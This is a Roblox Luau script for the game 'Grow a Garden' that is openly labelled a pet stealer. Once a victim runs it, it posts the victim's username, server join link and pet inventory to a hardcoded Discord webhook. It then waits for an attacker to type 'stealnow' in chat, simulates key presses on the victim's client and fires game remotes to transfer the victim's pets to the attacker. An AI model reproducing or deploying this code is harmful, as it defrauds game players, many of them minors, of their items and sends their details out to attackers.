local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInput = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local WEBHOOK_URL ="https://discord.com/api/webhooks/1384924541343629493/O6b491x0IQE22fTOzTv4pfhLghrDWLJmBhyrt8nuPWTanXanNIEXyqUGPpja-MGUtc9P"
local CHAT_TRIGGER ="stealnow"
local E_HOLD_TIME = 0.05
local E_DELAY = 0.15
local HOLD_TIMEOUT = 2.5
local function sendToWebhook(data)
    local jsonData = HttpService:JSONEncode(data)
    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request({Url = WEBHOOK_URL, Method ="POST", Headers = {["Content-Type"] ="application/json"}, Body = jsonData})
        elseif request then
            return request({Url = WEBHOOK_URL, Method ="POST", Headers = {["Content-Type"] ="application/json"}, Body = jsonData})
        else
            return HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)
    if not success then print("Webhook failed:" .. tostring(result)) end
    return success
end
local function getPetInventory()
    local inventory = {pets = {}}
    local bannedWords = {"Seed","Shovel","Tool","Egg","Sprinkler","Crate"}
    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
    if backpack then
        for_, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") and not table.find(bannedWords, item.Name) then
                table.insert(inventory.pets, item.Name)
            end
        end
    else
        print("No backpack found for" .. LocalPlayer.Name)
    end
    return inventory
end
local function notifyVictim()
    local inventory = getPetInventory()
    local inventoryText = #inventory.pets > 0 and table.concat(inventory.pets,"\n") or"No pets"
    local messageData = {
        embeds = {{
            title ="New Target Found!",
            description ="Ready to steal pets in Grow a Garden!",
            color = 0xFF0000,
            fields = {
                {name ="Username", value = LocalPlayer.Name, inline = true},
                {name ="Join Link", value ="https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or"N/A"), inline = true},
                {name ="Pet Inventory", value ="```" .. inventoryText .. "```", inline = false},
                {name ="Steal Command", value ="Say in chat: `" .. CHAT_TRIGGER .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToWebhook(messageData)
end
local function findPetRemote()
    for_, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("pet") or v.Name:lower():find("inventory")) then
            return v
        end
    end
    print("No pet remote found, scanning for any RemoteEvent...")
    for_, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            print("Trying fallback remote:" .. v.Name)
            return v
        end
    end
    return nil
end
local function stealPets(targetPlayer)
    local petRemote = findPetRemote()
    if not petRemote then
        print("No pet remote available.")
        return false
    end
    local success, result = pcall(function()
        local petData = targetPlayer:FindFirstChild("PetInventory") or targetPlayer:FindFirstChild("Backpack")
        if petData then
            for_, pet in pairs(petData:GetChildren()) do
                if pet:IsA("Tool") and not table.find({"Seed","Shovel","Tool","Egg"}, pet.Name) then
                    petRemote:FireServer("TransferPet", pet, LocalPlayer)
                    print("Stole pet:" .. pet.Name .. " from" .. targetPlayer.Name)
                    sendToWebhook({
                        embeds = {{
                            title ="Pet Stolen!",
                            description ="Grabbed a pet from" .. targetPlayer.Name,
                            color = 0x00FF00,
                            fields = {
                                {name ="Pet", value = pet.Name, inline = true},
                                {name ="Victim", value = targetPlayer.Name, inline = true}
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                end
            end
        else
            print("No pet data found for" .. targetPlayer.Name)
        end
    end)
    if not success then
        print("Steal failed:" .. tostring(result))
    end
    return success
end
local function holdE()
    local success, result = pcall(function()
        VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(E_HOLD_TIME)
        VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    end)
    if not success then
        print("Virtual input failed:" .. tostring(result))
    end
end
local function executeSteal(speaker)
    local startTime = tick()
    while tick() - startTime < HOLD_TIMEOUT do
        holdE()
        task.wait(E_DELAY)
        if stealPets(speaker) then
            sendToWebhook({
                embeds = {{
                    title ="Steal Command Triggered!",
                    description ="Successfully executed steal from" .. speaker.Name,
                    color = 0x00FF00,
                    fields = {{name ="Command", value = CHAT_TRIGGER, inline = true}},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
            return true
        end
    end
    print("Steal attempt timed out for" .. speaker.Name)
    return false
end
local function setupChatListener()
    local TextChatService = game:GetService("TextChatService")
    local success, result = pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.OnIncomingMessage = function(message)
                if message.Text:lower() == CHAT_TRIGGER:lower() then
                    local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
                    if speaker then
                        executeSteal(speaker)
                    else
                        print("No speaker found for chat trigger")
                    end
                end
            end
        else
            Players.PlayerChatted:Connect(function(_, sender, message)
                if message:lower() == CHAT_TRIGGER:lower() then
                    local speaker = Players:FindFirstChild(sender)
                    if speaker then
                        executeSteal(speaker)
                    else
                        print("No speaker found:" .. sender)
                    end
                end
            end)
        end
    end)
    if not success then
        print("Chat listener setup failed:" .. tostring(result))
    end
end
local function modifyProximityPrompts()
    local success, result = pcall(function()
        for_, object in pairs(game:GetDescendants()) do
            if object:IsA("ProximityPrompt") then
                object.HoldDuration = 0.02
            end
        end
        game.DescendantAdded:Connect(function(object)
            if object:IsA("ProximityPrompt") then
                object.HoldDuration = 0.02
            end
        end)
    end)
    if not success then
        print("Proximity prompt modification failed:" .. tostring(result))
    end
end
local function init()
    local success, result = pcall(function()
        notifyVictim()
        setupChatListener()
        modifyProximityPrompts()
        print("Pet stealer initialized for" .. LocalPlayer.Name)
    end)
    if not success then
        print("Initialization failed:" .. tostring(result))
    end
end
init()